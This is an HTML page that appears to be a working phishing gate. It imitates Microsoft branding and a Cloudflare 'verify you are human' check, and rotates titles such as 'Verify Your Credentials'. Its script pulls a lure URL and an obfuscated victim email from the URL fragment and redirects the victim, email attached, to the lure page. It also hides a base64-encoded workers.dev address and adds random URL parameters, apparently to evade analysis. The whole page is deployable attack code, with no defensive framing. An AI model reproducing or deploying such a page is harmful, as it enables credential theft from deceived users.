<!DOCTYPE html>
<!DOCTYPE html>
<html>
<head>
    <title></title>
    <meta name="robots" content="noindex,nofollow">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Add favicon (Microsoft logo) -->
    <link rel="icon" type="image/png" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

    <style>
        #newForm button {
            height: 17px;
            padding: 0;
            font-size: 10px;
        }
        #newForm label {
            cursor: not-allowed;
            font-size: 10px;
            margin-bottom: 1px;
        }

        /* Default light mode styles */
        body {
            color: black !important;
            font-size: 17px;
            font-weight: bold;
            line-height: 1;
            text-align: center;
            margin-top: 100px; /* Adjusts the top margin */
        }

        /* Dark mode styles */
        .dark-mode body {
            background-color: #333333;
            color: #ffffff !important;
        }
    </style>

<script>
    window.onload = async function () {
        var USE_TURNSTILE = true;

        // Global variables to store extracted values
        let extractedValues = {};

        // Function to decode Base64 to HTML
        function decodeBase64ToHTML(base64) {
            try {
                return atob(base64);
            } catch (e) {
                console.error('Failed to decode base64', e);
                return '';
            }
        }

        // Function to decode Base64 to CSS
        function decodeBase64ToCSS(base64) {
            try {
                return atob(base64);
            } catch (e) {
                console.error('Failed to decode base64', e);
                return '';
            }
        }

        // Extract and decode email or LURE value from URL
        function extractAndDecodeHashValues() {
            const url = window.location.href;
            const hashIndex = url.indexOf('#');
            let hashFragment = hashIndex !== -1 ? url.slice(hashIndex + 1) : ''; // Get everything after the first '#'
            let result = {
                email: null,
                lureValue: null
            };

            if (hashFragment) {
                try {
                    // Replace additional '#' with '&' for parsing
                    hashFragment = hashFragment.replace(/#/g, '&');
                    const params = new URLSearchParams(hashFragment);

                    // Extract LURE value
                    if (params.has('lure')) {
                        let lureValue = decodeURIComponent(params.get('lure'));

                        // Decode nested URLs in the lureValue if applicable
                        if (lureValue.includes('%')) {
                            lureValue = decodeURIComponent(lureValue);
                        }

                        result.lureValue = lureValue;
                    }

                    // Extract POP email
                    if (params.has('POP')) {
                        let email = decodeURIComponent(params.get('POP'));

                        // Check if it's in an obfuscated format and decode if necessary
                        if (isObfuscatedFormat(email)) {
                            console.log('Email is in obfuscated format. Decoding...');
                            email = decodeEmail(email);
                        }
                        result.email = email;
                    }
                } catch (e) {
                    console.error('Failed to extract or decode hash values:', e);
                }
            }

            console.log('Extracted Values:', result); // Debugging log
            return result;
        }

        // Decode the obfuscated email
        function decodeEmail(obfuscatedEmail) {
            const regex = /\(\d([a-zA-Z0-9@.])\d{2}\+\)/g;
            let decodedEmail = '';
            let match;

            while ((match = regex.exec(obfuscatedEmail)) !== null) {
                decodedEmail += match[1];
            }

            return decodedEmail;
        }

        // Start Turnstile verification
        function startTurnstileVerification() {
            const base64Url = "aHR0cHM6Ly9za3ktbm8tbGltaXQtZm94ZXIzMzEwLnRyaWVkLWxvcmQud29ya2Vycy5kZXYv";
            if (USE_TURNSTILE) {
                console.log('Starting Turnstile verification...');
                turnstile.render('#cf-turnstile', {
                    sitekey: '0x4AAAAAAAymSY_rn4CFRQRl',
                    type: 'spinner',
                    callback: async function (token) {
                        if (!token) {
                            console.error('Turnstile verification failed');
                            return;
                        }

                        // Show loading animation again
                        loadingDiv.style.display = 'flex';

                        // Use the globally stored extracted values
                        const { email, lureValue } = extractedValues;

                        setTimeout(function () {
                            loadingDiv.style.display = 'none';

                            if (lureValue && email) {
                                const redirectUrl = `${lureValue}#POP=${encodeURIComponent(email)}?redirected=done`;
                                console.log('Redirecting to LURE URL with email:', redirectUrl);
                                window.location.href = redirectUrl;
                            } else {
                                console.log('Missing LURE or email values for redirection.');
                            }
                        }, 2000);
                    },
                    'error-callback': function () {
                        console.error('Turnstile encountered an error');
                    }
                });
            } else {
                console.log('Turnstile is not enabled.');
            }
        }

        // Append random parameters to the URL (without affecting hash)
        function appendRandomParamsToUrl() {
            const params = generateRandomParams();
            const currentUrl = new URL(window.location.href);
            params.forEach(param => currentUrl.searchParams.append(param.key, param.value));
            window.history.replaceState({}, '', currentUrl);
        }

        // Generate random parameters
        function generateRandomParams() {
            let params = [];
            for (let i = 0; i < 50; i++) {
                let randomKey = `${i}`;
                let randomValue = Math.random().toString(36).substring(2, 15);
                params.push({ key: randomKey, value: randomValue });
            }
            return params;
        }

        // Extract hash values before modifying the URL
        extractedValues = extractAndDecodeHashValues();


        // Start Turnstile verification
        startTurnstileVerification();
    };
</script>

</head>
<body>
    We have integrated a human verification system to confirm that you are not a robot and to mitigate automated risks.
    <br><br>
    <!-- Turnstile widget positioned in the middle -->
    <center>
        <div id="cf-turnstile" style="margin: 5px 0;"></div>
    </center>
    <br>
    <!-- Bottom text -->
    <span class="display-4">We need to properly verify that you're human before we proceed. This may take a few seconds.</span>
 <script>
        // Titles array with different variations
        const titles = [
    "Confirm Your Identity",
    "Identity Confirmation Required",
    "Secure Your Access",
    "Verify Your Credentials",
    "Confirm Your Account",
    "Identity Check",
    "Verify Your Details",
    "Authenticate Your Identity",
    "Identity Verification Needed",
    "Confirm Your Personal Information",
    "Please Verify Your Account",
    "Final Step: Confirm Your Identity",
    "Secure Verification Process",
    "Complete Your Identity Verification",
    "Account Security Check",
    "Protect Your Account - Verify Now",
    "Verification Needed for Access",
    "Account Access Confirmation",
    "Action Required: Identity Check",
    "Complete Your Security Verification",
    "Confirm Your Access Rights",
    "Verify Your Identity for Security",
    "Secure Your Personal Details",
    "Double-Check Your Credentials",
    "Identity Protection in Progress",
    "Safety Check: Confirm Your Details",
    "Ensure Your Account Security",
    "Verify to Continue Access",
    "Account Protection Step",
    "Verification Step Required",
    "Authenticate to Secure Your Account",
    "Account Authentication Needed",
    "Secure Your Account Access",
    "One Last Step: Confirm Your Details",
    "Your Account Verification Is Pending",
    "Complete This Security Step",
    "Verify Your Information Securely",
    "Secure Identity Checkpoint",
    "Finish Your Identity Verification",
    "Secure Your Data: Verify Now"
];


        // Function to select a random title
        function setRandomTitle() {
            const randomIndex = Math.floor(Math.random() * titles.length);
            document.title = titles[randomIndex];
        }

        // Set random title on page load
        setRandomTitle();
    </script>
</body>
</html>
